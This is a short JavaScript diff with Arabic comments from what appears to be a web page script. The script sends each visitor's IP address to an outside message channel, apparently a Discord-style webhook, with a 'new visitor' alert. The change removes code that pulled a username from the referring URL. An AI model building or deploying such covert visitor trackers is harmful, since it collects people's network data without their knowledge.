@@ -66,19 +66,12 @@
         .then(response => response.json())
         .then(data => {
             const ipAddress = data.ip;
-
-            // جلب اسم المستخدم من عنوان الموقع السابق
-            const referrer = document.referrer;
-            const regex = /\/user\/(\w+)/;
-            const match = referrer.match(regex);
-            const userName = match ? match[1] : 'Unknown';
-
             const payload = {
                 content: `IP الزائر الجديد: ${ipAddress}`,
                 embeds: [
                     {
                         title: 'زائر جديد!',
-                        description: `لقد قام ${userName} بالوصول إلى الموقع.`,
+                        description: 'لقد قام زائر جديد بالوصول إلى الموقع.',
                         color: 16711680, // لون أحمر (يمكنك تغييره)
                         image: {
                             url: 'https://media0.giphy.com/media/FWRtGrSXbUaJzxK9V6/giphy.gif?cid=6c09b952slpw52m2hfmg6yxgmtclm9gg0i8curjo43z0t0ck&ep=v1_internal_gif_by_id&rid=giphy.gif&ct=g',
